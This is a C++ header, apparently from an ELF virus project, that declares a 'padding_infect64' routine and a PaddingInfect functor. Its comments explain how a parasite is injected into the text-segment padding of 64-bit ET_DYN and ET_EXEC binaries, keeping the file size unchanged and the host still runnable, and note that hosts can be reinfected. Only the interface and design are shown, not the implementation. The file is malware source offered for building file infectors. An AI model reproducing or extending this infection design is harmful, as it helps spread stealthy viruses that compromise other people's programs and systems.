#pragma once
#include "common/mmap.hh"

namespace vt::infector {
// This algorithm injects a parasite into an elf's text padding. It has the
// following characteristics:
//  - It infects 64 bit elfs.
//  - It infects ET_DYN (most common) and ET_EXEC.
//  - File size and attributes are the same.
//  - Original host code is undamaged. It will still run.
//  - It's possible to infect an infected host again. In other words, caller
//    should handle skipping logic.
//
//  host elf structure            infected elf structure
//  -------------------           -----------------------
//  elf_hdr                       elf_hdr
//  phdrs                         phdrs
//  executale_sections            executale_sections  
//  padding                       padding             <- virus inserted here
//  non-exec sections             non-exec sections
//  shdrs                         shdrs
//
//
// Because the sections in file has the same padding, inserting virus doesn't
// change file size.
//
//  infected elf segments
//  -------------------
//  LOAD RX
//    Ehdr
//    phdrs
//    interp
//  PADDING    <- virus here
//  LOAD RW
//    .data
//    ...
bool padding_infect64(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                      common::Mmap<PROT_READ> parasite_mapping);

struct PaddingInfect {
  static size_t output_size(size_t host_size, size_t parasite_size) {
    return host_size;
  }
  bool operator()(common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
                  common::Mmap<PROT_READ> parasite_mapping) {
    return padding_infect64(vt::move(host_mapping), vt::move(parasite_mapping));
  }
};

}  // namespace vt::infector